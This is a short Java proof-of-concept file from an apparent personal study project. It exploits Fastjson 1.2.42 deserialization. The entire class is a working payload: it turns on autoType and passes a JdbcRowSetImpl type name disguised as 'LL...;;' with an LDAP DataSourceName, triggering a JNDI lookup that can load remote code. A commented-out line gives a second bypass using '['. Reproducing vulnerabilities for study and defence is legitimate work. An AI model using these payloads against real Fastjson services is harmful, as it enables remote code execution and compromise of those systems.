package Fastjson.version42;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Fastjson.version42
 * @Author: Clown
 * @CreateTime: 2023-10-14  21:22
 */
public class poc42 {
    public static void main(String[] args) {
        String str = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
//      String str = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject(str);
        }
}